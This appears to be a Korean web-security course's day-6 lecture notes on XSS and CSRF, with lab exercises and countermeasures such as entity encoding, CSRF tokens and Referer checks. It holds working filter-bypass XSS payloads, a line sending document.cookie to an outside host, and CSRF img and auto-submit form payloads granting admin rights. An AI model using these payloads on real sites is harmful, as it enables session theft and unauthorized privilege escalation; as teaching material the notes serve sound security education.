@@ -1,0 +1,404 @@
+6일차
+
+Reflected XSS - 요청을 전송하자마자 응답에 악성코드 노출되어 실행
+1. Repeater에서 '모든' 파라미터 중에서 응답에 그대로 노출되는 파라미터 찾음 &lt;-
+
+Stored XSS -&gt; 공지사항 글-&gt; 악성코드
+악성코드를 -&gt; DB에 저장시켜서
+누군가가 조회를 할때 공격구문이 ##실행## -&gt; 출력
+1. 글 쓸때 Interceptor가지고 넣구요 &lt;- Javascript 클라이언트 미리 치환 
+
+글쓰기 
+제목 [ 안녕하세요         ]                a=?&amp;b=?&amp;제목=&amp;내용=
+내용 [ 반가워요&lt;script&gt;alert(1);&lt;/script&gt;         ]
+                [작성]
+Req -&gt; 버프
+&amp;lt;script&amp;gt; alert(1); 
+                                   &lt;Issue&gt; 홍수났다
+                 1) 여기에서 조치 X                2) 여기에서        &amp;lt;Issue&amp;gt; 홍수났다 
+글작성 브라우저     -----------&gt;  |||   서버       ------------&gt;   DB 저장   &lt;Issue&gt; 
+
+글조회 피해자      ------------&gt;       서버      ------------&gt;    DB 조회 select 
+                  &lt;-------------       HTML          &lt;------------
+                 **3) &lt; -&gt; &amp;lt;
+ 
+ &amp;amp;lt;Issue&amp;amp;gt;
+
+1) 의미없음
+!!2) 일단 공격이 되지 않도록 DB에 저장하기 
+   어디서 이걸 갖다 써도 공격이 X 
+   -&gt; 웹이 아닌 곳 모바일  &lt;Issue&gt; 홍수났다 
+   -&gt; 원본 데이터의 무결성 X 
+##3) 일단 DB 원본이 잘 저장 무결성 O 
+   조회하는 부분에서 -&gt; 빠짐없이 HTML Entity 치환 
+   
+
+
+2. 글 조회 Interceptor가지고 확인!
+
+
+2. 노출되는 파라미터가 어디에 위치하는지 
+  &lt;태그&gt;  __입력값__ &lt;태그&gt;
+  &lt;태그 속성="__입력값__"&gt;
+  &lt;script&gt;
+     __입력값__
+  &lt;/script&gt;
+3. 공격에 필요한 특수문자들 테스트 
+  &lt; &gt; () ; " ' / &lt;- HTML Entity 치환 
+  필터링
+  1) Whitelist 
+   얘는 다 막고 허용하는 거만 도로 풀어줘
+   &lt; &gt; -&gt; &amp;lt; &amp;gt; 
+   &lt;p&gt; -&gt; &lt;p&gt; 
+   입력값.replaceAll("&lt;", "&amp;lt;")
+   입력값.replaceAll("&gt;", "&amp;gt;")
+   입력값.replaceAll("&amp;lt;p&amp;gt;","&lt;p&gt;")
+   &amp;lt;img&amp;gt; src=
+   
+   
+  -&gt; 네이버 블로그  
+  -&gt; 티스토리 
+  -&gt; 웹에디터
+  2) Black/Blocklist -&gt; 오픈소스 공동 프로젝트-&gt; Filter
+   일단 다 써도돼 근데 공격은 X 
+   제대로 안막으면 다 우회됨 
+   script -&gt; ScRIPT 
+   script -&gt; 지워버리네? -&gt; scrscriptipt
+   &lt;script&gt; -&gt; 이거없다고 공격못함? -&gt; 다른 태그 &lt;태그 이벤트핸들러="악성코드"&gt; 
+   이벤트 핸들러도 잘 막아야함 
+   &lt;img src="__파일명__" onerror="공격코드; " /&gt;
+   __파일명__" onerror="공격코드; &lt;-
+   &lt;img src="  ~~~~~ " /&gt; &lt;- 이거는 허용해
+4. 공격포인트 파라미터를 정해
+5. 공격구문 넣어서 어떻게 나오는지 보고 -&gt; 주석 뒤에 문법까지 깔끔하게 맞춰 
+6. Copy URL -&gt; 이 링크를 뿌림~
+   
+
+POST GET    ?키=값&amp;키=값&amp;  &lt;- 문자열
+content-type: url-encoded-form-data 
+
+&lt;p&gt; &lt; &gt; &lt;/p&gt;
+
+&lt;&gt;"';/()
+&amp;amp;#34;
+
+xsstest1&lt;&gt;&amp;#34;&amp;#39;;/()
+
+
+============================
+* XSS 문제 6번     -&gt; 15분 풀이~
+============================
+1. 공격 포인트 
+ ex) 글 작성 처리되는 요청 Copy URL 
+    URL: https://lab.eqst.co.kr:8083/exam19/process/faqboardProcess.php
+    Parameter: title &lt;- 
+
+    ================ name="title"
+                             ^ 어느 파라미터에 넣었는지
+    내용~
+ 
+       
+2. 스크립트가 실행되는 URL 
+ ex) 문법이 완성되어 스크립트가 실행되는 응답 Copy URL 
+     https://lab.eqst.co.kr:8083/exam19/faqview.php?board_id=35632
+3. 공격 구문 
+4. 정답
+============================
+
+&lt;태그&gt; () ;'"/
+
+============================
+* XSS 문제 8번  -&gt; 45분에 풀이~
+============================
+1. 공격 포인트 
+2. 스크립트가 실행되는 URL 
+3. 공격 구문 
+4. 정답
+============================
+&lt;script&gt;alert('xss');&lt;/script&gt;
+alert('xss');
+&lt;script&gt; -&gt; 대소문자 
+&lt;sc&lt;scr&lt;scr&lt;scr&lt;scr&lt;script&gt;ipt&gt;ipt&gt;ipt&gt;ipt&gt;ript&gt;
+
+
+&lt;img&gt;&lt;a&gt;&lt;h1&gt;&lt;span&gt;&lt;div&gt;&lt;svg&gt;&lt;embed&gt;&lt;audio&gt;&lt;iframe&gt;
+&lt;img&gt;&lt;span&gt;
+&lt;img src=aldkfj onerror="alert('xss');" /&gt;
+============================
+* XSS 문제 9번 
+============================
+1. 공격 포인트 
+2. 스크립트가 실행되는 URL 
+3. 공격 구문 
+4. 정답
+============================
+&lt;script&gt;alert('xss');&lt;/script&gt;
+&lt;&gt;('xss');&lt;/&gt;
+&lt;&gt;('xss');&lt;/&gt;
+
+script 
+alert 지웠구나
+onerror
+
+입력값.replaceAll("script","");
+입력값.replaceAll("alert",""); 
+입력값.replaceAll("onerror","");
+
+&lt;scr ipt&gt;
+scr태그 ipt라는 속성
+
+&lt;img src=qwer  ="('xss');"/&gt;
+
+&lt;scscriptript&gt;alalertert('xss');&lt;/scrscriptipt&gt;
+&lt;img src=qwer oneronerrorror="alealertrt('xss');"/&gt;
+
+&lt;script&gt; -&gt; &lt;x-script&gt; &lt;asdfsadf&gt;
+
+
+공격구문 넣어서 실행되는 걸 확인했는데
+정답이 안뜬다? -&gt; 더 잘하신 거
+
+9번까지 다하신분 -&gt; 
+&lt;script&gt;
+&lt;img&gt;
+
+말고 다른걸로 공격해보세요. 되면 공격구문만 DM 보내주세요~
+
+입력값 노출 타입 3번인데(이미 스크립트 안에 들어있는데)
+어떻게 문법을 안망뜨리고 공격을 수행할것인가?
+http://192.168.72.40:5000
+
+
+
+
+&lt;script&gt;
+...
+if ('Y' == 'N' || 'N' == '__입력값__')
+    var check = '__입력값__';
+...
+&lt;/script&gt;
+
+
+
+&lt;script&gt;
+...
+               or 
+if ('Y' == 'N' || 'N' == 'a'|| alert('xss') ||'')
+    var check = 'a'|| alert('xss') ||'';
+...
+&lt;/script&gt;
+
+undefined 
+
+
+
+&lt;script&gt;
+...
+
+if ('Y' == 'N' || 'N' == '1'+alert('xss')+'2')
+    var check = '1'+alert('xss')+'2';
+...
+&lt;/script&gt;
+
+
+* XSS 
+* CSRF(Cross-site Request Forgery) 
+
+사용자로 하여금 서버의 기능을 자기도 모르게 실행시켜서 
+해커가 원하는대로 행동하게 만드는 것 
+
+https://test.com/member/changepw?newpw=1234
+
+Cookie:sessid=qqqqq  
+
+  aaaa                          cookie:sessid=qqqqq
+[                              [
+    id: test01                      id: admin
+]                               ]
+
+  update member set pw = ___newpw___ where id = 세션["id"]
+
+게시글을 작성 
+
+관리자님 봐주세요~
+
+https://test.com/member/changepw?newpw=1234 여기로 요청보내~ 코드
+
+
+fetch(https://seyong.kr/cookie=" + document.cookie) &lt;- XSS취약점 , img 태그취약점
+
+*                  XSS               vs              CSRF
+    스크립트만 실행                              해당 기능이 검증없이 요청만 보내면 실행
+                                                 XSS가 안되어도 공격을 할수 있음
+                                                 XSS가 되면 더 여러가지 공격을 할수 
+
+
+일반 사용자 계정: kkk@k.com 
+관리자 계정:  kkk@k.com_examadmin 
+X 
+관리자 정상적으로 사람 권한 -&gt; result:                                                  
+
+&lt;img src="https://lab.eqst.co.kr:8442/bbs11/updateGetAuth?loginId=kkk%40k.com&amp;adminYn=2"/&gt;
+
+&lt;script&gt; 
+ kkk@k.com 이사람을 admin으로 권한올리는 스크립트 짜줘~
+&lt;/script&gt;
+
+
+========================
+* CSRF 문제 1번
+========================
+1. 공격구문
+2. 정답
+========================
+
+
+&lt;script&gt;
+
+ var a = 1;
+ if 
+ fucntion
+&lt;태그 못씀&gt; XXX 
+ 자바스크립트 문법 
+&lt;/script&gt;
+
+&lt;textarea&gt;
+  &lt;script&gt; &lt;img &gt;
+&lt;/textarea&gt;
+
+
+본인이 작성한 글
+본인이 확인할 때
+제대로 공격 요청 날리는 지 확인!
+
+4시 10분 풀이~
+대응방안
+
+대응방안을 우회해서 공격
+&lt;img src="https://lab.eqst.co.kr:8444/csrfget/update_role_ok_get.jsp?target_id=kkk%40k.com&amp;new_role=ADMIN_GET" /&gt;
+
+* CSRF 대응방안 
+1. 근본적인 대응방안 - 추가 인증
+  해당 기능을 사용할 때 비밀번호를 다시 넣어서 확인/OTP/SMS/간편인증/ARS ..
+  MFA 2factor -&gt; 너무 귀찮음 
+  진짜 중요한기능
+
+2. 캡챠 Captcha -&gt; 구글, 오토바이를 모두 고르세요, 신호등을 모두 고르세요
+   123412 -&gt; 글씨쳐 
+   니가 사람인지 아닌지 확인
+   자동화 공격&lt;- 
+   몇몇 커뮤니티 글 리젠 -&gt; 글쓰기 옆에 [ 2347  ] 숫자사진
+   난 사람인데도 틀림 -&gt; 신호등
+   가용성에 문제가 있음 &lt;- 
+
+3. CSRF Token &lt;- 우회가 가능하다 -&gt; 공격구문 정교화
+ framework 
+   update_role.jsp                                  update_role_ok_get.jsp?targi csrf_token=탈취한토큰
+   권한변경 입력페이지                 -&gt;          실제로 처리하는 주소 
+
+  cookie:jsessionid=asdf
+ 
+ asdf                                                admin 
+                                                      qqqq 
+                                                      [ id:admin 
+                                                        
+[
+ id: kkk@k.com 
+ token: aaaa-bbbb-cccc
+]
+   
+  @RequestMapping("/update_role.jsp") 
+  public String roleForm() {                              public String update() {
+                                                              if token파라미터값==세션["token"]:
+                                                                     처리해
+                                                              else:
+                                                                  제대로 된 처리 요청이 아님!
+
+       token = 랜덤한 값;  aaaa-bbbb-cccc
+       세션["token"] = token;
+       &lt;input               name="target_id"&gt;
+       &lt;input               name="role"   &gt;
+       &lt;input type="hidden" name="token" value="aaaa-bbbb-cccc"&gt;
+  }
+
+
+4. Referer: 
+   직전 사이트 &lt;- 브라우저에서 붙여줍니다.
+https://lab.eqst.co.kr:8444/csrfget/update_role.jsp
+https://lab.eqst.co.kr:8444/csrfget/update_role_ok_get.jsp?target_id=admin&amp;new_role=USER
+
+
+update_role_ok_get.jsp 
+&lt;% 
+
+if referer헤더 값이 == "https://lab.eqst.co.kr:8444/csrfget/update_role.jsp":
+  권한 승인 처리해줘
+else:
+  너 엉뚱한데서 권한변경 요청이 들어왔다. 에러처리!
+
+-&gt;가용성, VPN, Proxy
+
+
+==================================
+========
+1. XSS를 막는다.
+2. GET-&gt; src="https://주소/?파라미터=asdf"
+   POST -&gt; 공격됨
+
+  &lt;form action="주소" method="POST"&gt;
+   &lt;input name="target_id" value="내아이디"&gt;
+   &lt;input name="권한" value="관리자"&gt;
+   &lt;button&gt;제발눌러주세요&lt;/button&gt;
+  &lt;/form&gt;
+  javascript
+
+
+
+3. SAME-SITE: strict; &lt;- 
+ 서로 다른 사이트여도 즉 게시판이 없어도 해당 기능 요청만 보내면
+공격이 가능하다.
+xss -&gt; cookie 
+   hacker.com &lt;- document.cookie 빼와
+   bank.com&lt;-
+
+   권한변경 게시판X -&gt; 관리자한테 메일, 문자, 카톡을 링크만들어서 주면
+
+   hacker.com/ 
+   bit.ly/qeworij -&gt; 
+
+   &lt;html&gt;
+
+  &lt;img src="https://lab.eqst.co.kr:8444/csrfget/update_role_ok_get.jsp?target_id=kkk%40k.com&amp;new_role=ADMIN_GET" /&gt;
+
+
+
+
+========================
+* CSRF 문제 2번
+========================
+1. 공격구문
+2. 정답
+========================
+
+https://lab.eqst.co.kr:8442/bbs11/updatePostAuth?loginId=kkk%40k.com&amp;adminYn=2
+
+
+POST /bbs11/updatePostAuth
+
+loginId=kkk%40k.com&amp;adminYn=2
+
+&lt;form id="attack" action="/bbs11/updatePostAuth" method="POST"&gt;
+    &lt;input type="hidden" name="loginId" value="kkk@k.com"&gt;
+    &lt;input type="hidden" name="adminYn" value="2"&gt;    
+&lt;/form&gt;
+&lt;script&gt;document.getElementById("attack").submit();&lt;/script&gt;
+
+
+
+========================
+* CSRF 문제 3번
+========================
+1. 공격구문
+2. 정답
+========================
+</code></pre><div class="info">© 2025 Seyong Kim. All Rights Reserved.</div></div></body></html>
